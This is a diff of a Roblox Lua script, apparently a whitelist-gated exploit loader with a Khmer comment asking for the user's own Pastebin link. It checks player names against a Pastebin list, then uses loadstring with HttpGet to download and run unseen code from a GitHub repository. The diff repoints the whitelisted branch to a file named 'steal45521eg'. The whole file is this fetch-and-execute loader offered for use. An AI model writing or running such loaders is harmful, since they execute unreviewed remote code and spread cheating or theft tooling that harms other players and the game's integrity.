@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 -- ដាក់ Raw Link Pastebin របស់អ្នកនៅទីនេះ
-local pastebinUrl = "https://pastebin.com/raw/Dyy437Tk"
+local pastebinUrl = "https://pastebin.com/raw/d1wW39Xe"
 
 local allowedNames = {}
 local success, response = pcall(function()
@@ -28,7 +28,7 @@ for _, name in ipairs(allowedNames) do
 end
 
 if isAllowed then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/kokakola1234523/2215/refs/heads/main/2343g2"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/kokakola1234523/2215/refs/heads/main/steal45521eg"))()
 else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/kokakola1234523/2215/refs/heads/main/tte"))()
 end
